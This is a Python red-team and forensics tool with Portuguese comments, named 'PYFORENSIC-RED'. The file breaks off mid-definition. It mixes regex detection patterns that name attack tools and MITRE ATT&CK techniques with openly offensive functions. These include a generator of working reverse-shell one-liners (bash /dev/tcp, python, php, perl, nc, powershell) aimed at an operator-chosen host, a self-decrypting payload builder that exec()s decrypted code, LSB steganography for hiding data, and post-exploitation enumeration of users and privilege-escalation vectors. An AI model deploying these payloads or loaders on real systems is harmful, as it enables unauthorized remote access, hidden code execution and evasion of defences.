#!/usr/bin/env python3
"""
================================================================================
PYFORENSIC-RED: Ferramenta Avançada de Análise Forense e Simulação de Red Team
================================================================================
DESCRIÇÃO: Ferramenta para análise forense, emulação de adversários e testes
           de penetração com técnicas MITRE ATT&CK integradas
VERSÃO: 3.0 - OPERAÇÃO CRIMSON
AUTOR: Time Vermelho
CLASSIFICAÇÃO: RESTRITO - USO APENAS EM AMBIENTES AUTORIZADOS
================================================================================
"""

import os
import re
import sys
import json
import yaml
import argparse
import ipaddress
import hashlib
import tarfile
import zipfile
import platform
import sqlite3
import socket
import struct
import random
import string
import time
import subprocess
import base64
from datetime import datetime, timedelta
from collections import defaultdict, Counter, deque
from pathlib import Path
from typing import Dict, List, Set, Tuple, Optional, Any, Union
from enum import Enum
import logging
import warnings

# Suprimir warnings específicos
warnings.filterwarnings('ignore', category=DeprecationWarning)

# Tentar importar bibliotecas avançadas
try:
    import numpy as np
    import pandas as pd
    NP_AVAILABLE = True
except ImportError:
    NP_AVAILABLE = False
    np = None
    pd = None

try:
    from scipy import stats
    SCIPY_AVAILABLE = True
except ImportError:
    SCIPY_AVAILABLE = False

try:
    from sklearn.ensemble import IsolationForest
    from sklearn.cluster import DBSCAN
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False

try:
    import networkx as nx
    NETWORKX_AVAILABLE = True
except ImportError:
    NETWORKX_AVAILABLE = False

try:
    import cryptography
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    import paramiko
    import pymongo
    import psycopg2
    import redis
    import pymssql
    DATABASE_AVAILABLE = True
except ImportError:
    DATABASE_AVAILABLE = False

try:
    import requests
    from bs4 import BeautifulSoup
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Configuração avançada de logging
class RedTeamFormatter(logging.Formatter):
    """Formatter customizado para operações Red Team"""
    
    FORMATS = {
        logging.DEBUG: '🌀 [DEBUG] %(message)s',
        logging.INFO: '📡 [INFO] %(message)s',
        logging.WARNING: '⚠️ [WARNING] %(message)s',
        logging.ERROR: '🔥 [ERROR] %(message)s',
        logging.CRITICAL: '💀 [CRITICAL] %(message)s'
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt='%Y-%m-%d %H:%M:%S')
        return formatter.format(record)

# Configurar logger principal
logger = logging.getLogger('pyforensic_red')
logger.setLevel(logging.INFO)

# Handler para console
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)
ch.setFormatter(RedTeamFormatter())
logger.addHandler(ch)

# Handler para arquivo
log_file = 'pyforensic_red_operation.log'
try:
    fh = logging.FileHandler(log_file)
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
    logger.addHandler(fh)
except Exception as e:
    logger.warning(f"Não foi possível criar arquivo de log: {e}")

class ThreatLevel(Enum):
    """Níveis de ameaça baseados em técnicas Red Team"""
    RECON = 1
    WEAPONIZATION = 2
    DELIVERY = 3
    EXPLOITATION = 4
    INSTALLATION = 5
    C2 = 6
    ACTION = 7
    PERSISTENCE = 8
    DEFENSE_EVASION = 9
    CREDENTIAL_ACCESS = 10
    DISCOVERY = 11
    LATERAL_MOVEMENT = 12
    COLLECTION = 13
    EXFILTRATION = 14
    IMPACT = 15

class AttackTactic(Enum):
    """Táticas MITRE ATT&CK"""
    RECONNAISSANCE = "TA0043"
    RESOURCE_DEVELOPMENT = "TA0042"
    INITIAL_ACCESS = "TA0001"
    EXECUTION = "TA0002"
    PERSISTENCE = "TA0003"
    PRIVILEGE_ESCALATION = "TA0004"
    DEFENSE_EVASION = "TA0005"
    CREDENTIAL_ACCESS = "TA0006"
    DISCOVERY = "TA0007"
    LATERAL_MOVEMENT = "TA0008"
    COLLECTION = "TA0009"
    COMMAND_AND_CONTROL = "TA0011"
    EXFILTRATION = "TA0010"
    IMPACT = "TA0040"

class RedTeamTechniques:
    """Técnicas de Red Team e TTPs (Tactics, Techniques, Procedures)"""
    
    TECHNIQUES = {
        "T1595": {"name": "Active Scanning", "tactic": "RECONNAISSANCE"},
        "T1589": {"name": "Gather Victim Identity Information", "tactic": "RECONNAISSANCE"},
        "T1190": {"name": "Exploit Public-Facing Application", "tactic": "INITIAL_ACCESS"},
        "T1133": {"name": "External Remote Services", "tactic": "PERSISTENCE"},
        "T1059": {"name": "Command and Scripting Interpreter", "tactic": "EXECUTION"},
        "T1078": {"name": "Valid Accounts", "tactic": "DEFENSE_EVASION"},
        "T1003": {"name": "OS Credential Dumping", "tactic": "CREDENTIAL_ACCESS"},
        "T1018": {"name": "Remote System Discovery", "tactic": "DISCOVERY"},
        "T1021": {"name": "Remote Services", "tactic": "LATERAL_MOVEMENT"},
        "T1048": {"name": "Exfiltration Over Alternative Protocol", "tactic": "EXFILTRATION"},
        "T1489": {"name": "Service Stop", "tactic": "IMPACT"},
        "T1562": {"name": "Impair Defenses", "tactic": "DEFENSE_EVASION"},
        "T1055": {"name": "Process Injection", "tactic": "DEFENSE_EVASION"},
        "T1548": {"name": "Abuse Elevation Control Mechanism", "tactic": "PRIVILEGE_ESCALATION"},
        "T1204": {"name": "User Execution", "tactic": "EXECUTION"},
        "T1574": {"name": "Hijack Execution Flow", "tactic": "PERSISTENCE"},
        "T1098": {"name": "Account Manipulation", "tactic": "PERSISTENCE"},
        "T1210": {"name": "Exploitation of Remote Services", "tactic": "LATERAL_MOVEMENT"},
        "T1046": {"name": "Network Service Scanning", "tactic": "DISCOVERY"},
        "T1105": {"name": "Ingress Tool Transfer", "tactic": "COMMAND_AND_CONTROL"}
    }
    
    # Padrões de IOCs avançados para Red Team
    C2_PATTERNS = [
        r"\.onion($|/)",
        r"\.xyz($|/)",
        r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{4,5}",
        r"https?://[^/]+/api/v\d+/",
        r"user-agent:.*(python|curl|wget|powershell)",
        r"(cmd\.exe|powershell|bash|sh).*-(enc|-e|-c)",
        r"base64.*[a-zA-Z0-9+/]{50,}={0,2}",
        r"eval\(.*\)",
        r"fromCharCode.*\(.*\)",
        r"document\.write.*String",
        r"setTimeout.*function",
        r"XMLHttpRequest",
        r"WebSocket",
        r".*\.php\?id=[a-f0-9]{32}",
        r".*\.asp\?.*cmd=",
        r".*\.jsp\?.*pass="
    ]
    
    LATERAL_MOVEMENT = [
        r"psexec.*-s.*cmd",
        r"wmic.*process.*call",
        r"schtasks.*/create.*/tr",
        r"sc.*\\\\[^\\]+.*create",
        r"at\\\\[^\\]+.*[0-9]{2}:[0-9]{2}",
        r"net.*use.*\\\\[^\\]+",
        r"copy.*\\\\[^\\]+",
        r"invoke-command.*-computername",
        r"enter-pssession",
        r"smbclient.*-L",
        r"nmap.*-sS.*-p.*[0-9]+",
        r"crackmapexec.*smb",
        r"responder.*-I",
        r"bloodhound.*collect",
        r"secretsdump.*-just-dc"
    ]
    
    PERSISTENCE_TECHNIQUES = [
        r"reg.*add.*HKLM.*Run",
        r"schtasks.*/create.*/tn",
        r"New-ScheduledTaskAction",
        r"Set-ItemProperty.*registry",
        r"Startup.*folder",
        r"service.*create.*binpath",
        r"wmic.*process.*startup",
        r"Add-MpPreference.*-ExclusionPath",
        r"autoruns.*/accepteula",
        r"bcedit.*/set.*bootstatuspolicy",
        r"New-ItemProperty.*-Path.*HKLM",
        r"GPO.*update",
        r"task.*/create.*/xml",
        r"COM.*hijacking",
        r"IFEO.*debugger"
    ]
    
    EXPLOITATION_PATTERNS = [
        r"msfconsole.*use.*exploit",
        r"python.*-c.*import.*socket",
        r"gcc.*-o.*exploit",
        r"chmod.*\+x.*exploit",
        r"perl.*-e.*socket",
        r"java.*-jar.*ysoserial",
        r"sqlmap.*-u.*--dbs",
        r"nmap.*--script.*vuln",
        r"searchsploit.*[a-zA-Z0-9]+",
        r"rdesktop.*-u.*-p",
        r"hydra.*-l.*-P.*ssh",
        r"john.*--format.*nt",
        r"hashcat.*-m.*1000",
        r"responder.*-wrf",
        r"ntlmrelayx.*-tf",
        r"bloodhound-python.*-c",
        r"crackmapexec.*--local-auth"
    ]
    
    @classmethod
    def detect_ttp(cls, log_entry: str) -> List[Dict]:
        """Detecta TTPs (Tactics, Techniques, Procedures) em entradas de log"""
        detected_ttps = []
        
        # Verificar cada técnica
        for tech_id, tech_info in cls.TECHNIQUES.items():
            patterns = cls._get_patterns_for_technique(tech_id)
            for pattern in patterns:
                match = re.search(pattern, log_entry, re.IGNORECASE)
                if match:
                    detected_ttps.append({
                        "technique_id": tech_id,
                        "technique_name": tech_info["name"],
                        "tactic": tech_info["tactic"],
                        "confidence": 0.8,
                        "evidence": match.group()
                    })
                    break
        
        return detected_ttps
    
    @classmethod
    def _get_patterns_for_technique(cls, technique_id: str) -> List[str]:
        """Retorna padrões regex para uma técnica específica"""
        technique_patterns = {
            "T1595": cls.C2_PATTERNS + [r"scan.*port", r"nmap", r"masscan"],
            "T1059": [r"cmd\.exe", r"powershell", r"bash", r"sh", r"python.*-c"],
            "T1003": [r"mimikatz", r"lsass", r"procdump", r"sekurlsa"],
            "T1021": cls.LATERAL_MOVEMENT,
            "T1048": cls.C2_PATTERNS,
            "T1078": [r"valid.*account", r"domain.*admin", r"kerberos.*ticket"],
            "T1133": cls.PERSISTENCE_TECHNIQUES,
            "T1210": cls.EXPLOITATION_PATTERNS,
            "T1562": [r"disable.*firewall", r"stop.*service", r"uninstall.*av"],
            "T1548": [r"bypassuac", r"runas", r"sudo.*-i"],
            "T1204": [r"click.*link", r"open.*attachment", r"macros"],
            "T1574": [r"dll.*hijack", r"ld_preload", r"image.*hijack"]
        }
        
        return technique_patterns.get(technique_id, [])

class Steganography:
    """Técnicas de esteganografia para ocultação de dados"""
    
    @staticmethod
    def hide_in_png(image_path: str, data: bytes, output_path: str) -> bool:
        """Esconde dados em uma imagem PNG usando LSB (Least Significant Bit)"""
        if not PIL_AVAILABLE:
            logger.error("PIL/Pillow não disponível para esteganografia")
            return False
            
        try:
            # Tentar importar bitarray se disponível
            try:
                import bitarray
                BITARRAY_AVAILABLE = True
            except ImportError:
                BITARRAY_AVAILABLE = False
                logger.warning("bitarray não disponível, usando método alternativo")
            
            img = Image.open(image_path)
            if img.mode not in ('RGB', 'RGBA'):
                img = img.convert('RGB')
            
            # Converter dados para bits
            if BITARRAY_AVAILABLE:
                bits = bitarray.bitarray()
                bits.frombytes(data)
                
                # Adicionar marcador de fim
                end_marker = bitarray.bitarray()
                end_marker.frombytes(b'END')
                bits.extend(end_marker)
                
                data_bits = bits
            else:
                # Método alternativo sem bitarray
                data_bytes = data + b'END'
                data_bits = ''.join(format(byte, '08b') for byte in data_bytes)
            
            # Embed nos pixels
            pixels = list(img.getdata())
            new_pixels = []
            bit_index = 0
            
            for pixel in pixels:
                if bit_index >= len(data_bits):
                    new_pixels.append(pixel)
                    continue
                
                r, g, b = pixel[:3]
                
                # Modificar o LSB de cada canal
                if BITARRAY_AVAILABLE:
                    if bit_index < len(data_bits):
                        r = (r & ~1) | data_bits[bit_index]
                        bit_index += 1
                    
                    if bit_index < len(data_bits):
                        g = (g & ~1) | data_bits[bit_index]
                        bit_index += 1
                    
                    if bit_index < len(data_bits):
                        b = (b & ~1) | data_bits[bit_index]
                        bit_index += 1
                else:
                    # Método alternativo
                    if bit_index < len(data_bits):
                        r = (r & ~1) | int(data_bits[bit_index])
                        bit_index += 1
                    
                    if bit_index < len(data_bits):
                        g = (g & ~1) | int(data_bits[bit_index])
                        bit_index += 1
                    
                    if bit_index < len(data_bits):
                        b = (b & ~1) | int(data_bits[bit_index])
                        bit_index += 1
                
                if len(pixel) == 4:
                    new_pixels.append((r, g, b, pixel[3]))
                else:
                    new_pixels.append((r, g, b))
            
            # Criar nova imagem
            new_img = Image.new(img.mode, img.size)
            new_img.putdata(new_pixels)
            new_img.save(output_path)
            
            return True
            
        except Exception as e:
            logger.error(f"Erro em esteganografia: {e}")
            return False
    
    @staticmethod
    def extract_from_png(image_path: str) -> Optional[bytes]:
        """Extrai dados escondidos de uma imagem PNG"""
        if not PIL_AVAILABLE:
            logger.error("PIL/Pillow não disponível para esteganografia")
            return None
            
        try:
            # Tentar importar bitarray se disponível
            try:
                import bitarray
                BITARRAY_AVAILABLE = True
            except ImportError:
                BITARRAY_AVAILABLE = False
            
            img = Image.open(image_path)
            pixels = list(img.getdata())
            
            if BITARRAY_AVAILABLE:
                bits = bitarray.bitarray()
                for pixel in pixels:
                    r, g, b = pixel[:3]
                    bits.append(r & 1)
                    bits.append(g & 1)
                    bits.append(b & 1)
                
                # Encontrar marcador de fim
                data_bytes = bits.tobytes()
            else:
                # Método alternativo
                bits = []
                for pixel in pixels:
                    r, g, b = pixel[:3]
                    bits.append(str(r & 1))
                    bits.append(str(g & 1))
                    bits.append(str(b & 1))
                
                # Converter bits para bytes
                bit_string = ''.join(bits)
                data_bytes = bytes(int(bit_string[i:i+8], 2) for i in range(0, len(bit_string) - len(bit_string) % 8, 8))
            
            # Encontrar marcador de fim
            end_pos = data_bytes.find(b'END')
            
            if end_pos != -1:
                return data_bytes[:end_pos]
            
            return None
            
        except Exception as e:
            logger.error(f"Erro ao extrair dados: {e}")
            return None

class CryptoOps:
    """Operações criptográficas para Red Team"""
    
    @staticmethod
    def generate_aes_key(password: str, salt: bytes = None) -> Optional[bytes]:
        """Gera uma chave AES a partir de uma senha"""
        if not CRYPTO_AVAILABLE:
            logger.error("Biblioteca cryptography não disponível")
            return None
            
        try:
            if salt is None:
                salt = os.urandom(16)
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
                backend=default_backend()
            )
            
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            return key
            
        except Exception as e:
            logger.error(f"Erro ao gerar chave AES: {e}")
            return None
    
    @staticmethod
    def encrypt_file(file_path: str, key: bytes) -> Optional[str]:
        """Criptografa um arquivo com AES"""
        if not CRYPTO_AVAILABLE:
            logger.error("Biblioteca cryptography não disponível")
            return None
            
        try:
            fernet = Fernet(key)
            
            with open(file_path, 'rb') as f:
                data = f.read()
            
            encrypted = fernet.encrypt(data)
            
            output_path = f"{file_path}.encrypted"
            with open(output_path, 'wb') as f:
                f.write(encrypted)
            
            return output_path
            
        except Exception as e:
            logger.error(f"Erro ao criptografar: {e}")
            return None
    
    @staticmethod
    def decrypt_file(file_path: str, key: bytes) -> Optional[str]:
        """Descriptografa um arquivo"""
        if not CRYPTO_AVAILABLE:
            logger.error("Biblioteca cryptography não disponível")
            return None
            
        try:
            fernet = Fernet(key)
            
            with open(file_path, 'rb') as f:
                encrypted = f.read()
            
            decrypted = fernet.decrypt(encrypted)
            
            output_path = file_path.replace('.encrypted', '.decrypted')
            with open(output_path, 'wb') as f:
                f.write(decrypted)
            
            return output_path
            
        except Exception as e:
            logger.error(f"Erro ao descriptografar: {e}")
            return None
    
    @staticmethod
    def create_self_decrypting_payload(encrypted_data: bytes, key: bytes) -> str:
        """Cria um payload auto-extraível/auto-descritografável"""
        template = '''
import base64
from cryptography.fernet import Fernet

# Dados criptografados
ENCRYPTED = {encrypted}

# Chave
KEY = {key}

# Decriptar
fernet = Fernet(KEY)
decrypted = fernet.decrypt(ENCRYPTED)

# Executar
exec(decrypted.decode())
'''
        
        encrypted_b64 = base64.b64encode(encrypted_data).decode()
        key_b64 = base64.b64encode(key).decode()
        
        payload = template.format(encrypted=repr(encrypted_b64), key=repr(key_b64))
        
        return payload

class NetworkOperatives:
    """Operações de rede para Red Team"""
    
    def __init__(self):
        self.packet_queue = deque(maxlen=1000)
        self.connections = {}
        
    @staticmethod
    def scan_network(subnet: str, ports: List[int] = None) -> Dict:
        """Escaneamento de rede com fingerprinting"""
        if not NMAP_AVAILABLE:
            logger.warning("nmap não disponível")
            return {}
        
        try:
            nm = nmap.PortScanner()
            
            if ports is None:
                ports = "21-23,25,53,80,110,111,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080"
            
            logger.info(f"Escaneando rede: {subnet}")
            nm.scan(hosts=subnet, arguments=f"-sS -p {ports} -T4")
            
            results = {}
            for host in nm.all_hosts():
                host_info = {
                    'state': nm[host].state(),
                    'hostnames': nm[host].hostnames(),
                    'ports': {}
                }
                
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        port_info = nm[host][proto][port]
                        host_info['ports'][port] = {
                            'state': port_info['state'],
                            'service': port_info.get('name', 'unknown'),
                            'version': port_info.get('version', ''),
                            'product': port_info.get('product', '')
                        }
                
                results[host] = host_info
            
            return results
            
        except Exception as e:
            logger.error(f"Erro no scan: {e}")
            return {}
    
    @staticmethod
    def sniff_traffic(interface: str = None, count: int = 100) -> List:
        """Sniff de pacotes de rede"""
        if not SCAPY_AVAILABLE:
            logger.warning("scapy não disponível")
            return []
        
        try:
            packets = []
            
            def packet_callback(packet):
                packets.append(packet)
                if len(packets) >= count:
                    return True
            
            if interface:
                scapy.sniff(iface=interface, prn=packet_callback, store=False, count=count)
            else:
                scapy.sniff(prn=packet_callback, store=False, count=count)
            
            return packets
            
        except Exception as e:
            logger.error(f"Erro no sniff: {e}")
            return []
    
    @staticmethod
    def analyze_packets(packets: List) -> Dict:
        """Análise de pacotes capturados"""
        if not SCAPY_AVAILABLE:
            return {'protocols': {}, 'ips': {}, 'ports': {}, 'suspicious': []}
            
        analysis = {
            'protocols': defaultdict(int),
            'ips': defaultdict(int),
            'ports': defaultdict(int),
            'suspicious': []
        }
        
        for packet in packets:
            # Contar protocolos
            if packet.haslayer(scapy.IP):
                analysis['protocols']['IP'] += 1
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                analysis['ips'][src_ip] += 1
                analysis['ips'][dst_ip] += 1
            
            if packet.haslayer(scapy.TCP):
                analysis['protocols']['TCP'] += 1
                src_port = packet[scapy.TCP].sport
                dst_port = packet[scapy.TCP].dport
                analysis['ports'][src_port] += 1
                analysis['ports'][dst_port] += 1
            
            if packet.haslayer(scapy.UDP):
                analysis['protocols']['UDP'] += 1
            
            # Detectar atividades suspeitas
            if packet.haslayer(scapy.Raw):
                try:
                    payload = str(packet[scapy.Raw].load)
                    
                    # Verificar por IOCs
                    iocs = RedTeamTechniques.C2_PATTERNS + RedTeamTechniques.LATERAL_MOVEMENT
                    for pattern in iocs:
                        if re.search(pattern, payload, re.IGNORECASE):
                            analysis['suspicious'].append({
                                'packet': packet.summary(),
                                'pattern': pattern,
                                'payload': payload[:100]
                            })
                            break
                except:
                    continue
        
        return analysis
    
    @staticmethod
    def create_reverse_shell_payload(lhost: str, lport: int, platform_type: str = "linux") -> str:
        """Gera payloads de reverse shell"""
        payloads = {
            "linux": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_traditional": f"nc.traditional -e /bin/sh {lhost} {lport}",
            "ncat": f"ncat {lhost} {lport} -e /bin/bash",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        return payloads.get(platform_type, payloads["linux"])

class PostExploitation:
    """Técnicas de pós-exploração"""
    
    @staticmethod
    def gather_system_info() -> Dict:
        """Coleta informações do sistema comprometido"""
        info = {
            'system': {},
            'network': {},
            'users': [],
            'processes': [],
            'services': [],
            'scheduled_tasks': []
        }
        
        try:
            # Informações do sistema
            info['system']['platform'] = platform.platform()
            info['system']['hostname'] = platform.node()
            info['system']['architecture'] = platform.machine()
            info['system']['processor'] = platform.processor()
            
            # Informações de rede
            if NETIFACES_AVAILABLE:
                try:
                    for iface in netifaces.interfaces():
                        addrs = netifaces.ifaddresses(iface)
                        if netifaces.AF_INET in addrs:
                            info['network'][iface] = addrs[netifaces.AF_INET]
                except:
                    pass
            
            # Usuários (simplificado)
            if platform.system() == 'Windows':
                try:
                    result = subprocess.run(
                        'net user',
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.stdout:
                        lines = result.stdout.split('\n')
                        users = [line.strip() for line in lines[4:-2] if line.strip()]
                        info['users'] = users[:20]
                except:
                    pass
            else:
                try:
                    with open('/etc/passwd', 'r') as f:
                        users = [line.split(':')[0] for line in f.readlines()]
                        info['users'] = users[:20]
                except:
                    pass
            
            # Processos
            if PSUTIL_AVAILABLE:
                try:
                    for proc in psutil.process_iter(['pid', 'name', 'username']):
                        try:
                            info['processes'].append(proc.info)
                        except:
                            continue
                    
                    # Limitar número de processos
                    info['processes'] = info['processes'][:50]
                except:
                    pass
            
        except Exception as e:
            logger.error(f"Erro ao coletar informações: {e}")
        
        return info
    
    @staticmethod
    def check_privesc_vectors() -> List[Dict]:
        """Verifica vetores de escalação de privilégio"""
        vectors = []
        
        # Verificações comuns
        checks = [
            {
                'name': 'SUID Binaries',
                'command': 'find / -perm -4000 -type f 2>/dev/null',
                'platform': 'linux'
            },
            {
                'name': 'Writable Directories',
                'command': 'find / -type d -perm -o+w 2>/dev/null',
                'platform': 'linux'
            },
            {
                'name': 'Crontab Entries',
                'command': 'crontab -l 2>/dev/null',
                'platform': 'linux'
            },
            {
                'name': 'Sudo Permissions',
                'command': 'sudo -l',
                'platform': 'linux'
            },
            {
                'name': 'Capabilities',
                'command': 'getcap -r / 2>/dev/null',
                'platform': 'linux'
            }
        ]
        
        current_platform = platform.system().lower()
        
        for check in checks:
            if check['platform'] in current_platform:
                try:
                    result = subprocess.run(
                        check['command'],
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    if result.stdout.strip():
                        vectors.append({
                            'vector': check['name'],
                            'output': result.stdout[:500]
                        })
                except:
                    continue
        
        return vectors
    
    @staticmethod
    def dump_credentials() -> Dict:
        """Tenta extrair credenciais (para ambientes autorizados!)"""
        credentials = {
            'hashes': [],
            'passwords': [],
            'tickets': []
        }
        
        # AVISO: Esta função é apenas para fins educacionais
        logger.warning("Função de dump de credenciais é apenas para simulação!")
        
        return credentials

class AdvancedLogAnalyzer:
    """Analisador avançado de logs com técnicas Red Team"""
    
    def __init__(self, config_path: str = None):
        self.config = self.load_config(config_path)
        self.ttp_detector = RedTeamTechniques()
        self.network_ops = NetworkOperatives()
        self.post_exploit = PostExploitation()
        
        # Banco de dados para IOCs e TTPs
        self.setup_ttp_database()
        
        # Machine Learning para detecção de anomalias
        self.anomaly_detector = self.setup_anomaly_detector()
        
        # Grafos para análise de relacionamentos
        self.attack_graph = nx.DiGraph() if NETWORKX_AVAILABLE else None
        
    def load_config(self, config_path: str = None) -> Dict